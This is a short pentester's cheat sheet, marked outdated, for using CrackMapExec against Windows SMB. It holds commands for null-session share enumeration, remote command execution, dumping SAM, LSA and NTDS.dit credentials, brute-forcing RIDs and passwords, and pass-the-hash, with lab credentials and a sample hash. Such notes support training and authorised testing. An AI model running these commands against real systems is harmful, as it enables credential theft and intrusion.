**OUTDATED!** Newer one is [[nxc]]
Attacks: #PtH 
# SMB
```bash
$ crackmapexec smb <IP> --shares -u '' -p ''
```
## Useful Flags
- `--continue-on-success`: To keep on bruteforcing after a successful login.
- `--local-auth`: If the target is a non-domain joined system.

## SMBExec
```shell-session
$ crackmapexec smb <IP> -u <USER> -p <PASSWORD> -x <COMMAND> --exec-method smbexec
```
>NOTE: If the `--exec-method` is not defined, CME will try to execute the `atexec` method by default
## Dump
### Dump LSA/SAM Remotely
```shell-session
$ crackmapexec smb <IP> --local-auth -u bob -p HTB_@cademy_stdnt! --<lsa/sam>
```
### Dump NTDS.dit
```shell-session
$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```
### Logged-on Users
```shell-session
$ crackmapexec smb <CIDR-RAMGE> -u administrator -p <PASSWORD> --loggedon-users
```
## Bruteforce
### Bruteforce RIDs
```shell-session
$ crackmapexec smb <IP> -u 'guest' -p '' --rid-brute
```
### Bruteforce Username/Passwords
```shell-session
$ crackmapexec smb <IP> -u </path/to/username> -p </path/to/passwords>
```

## Pass the Hash
```shell-session
# crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 [-x <COMMAND>]
```
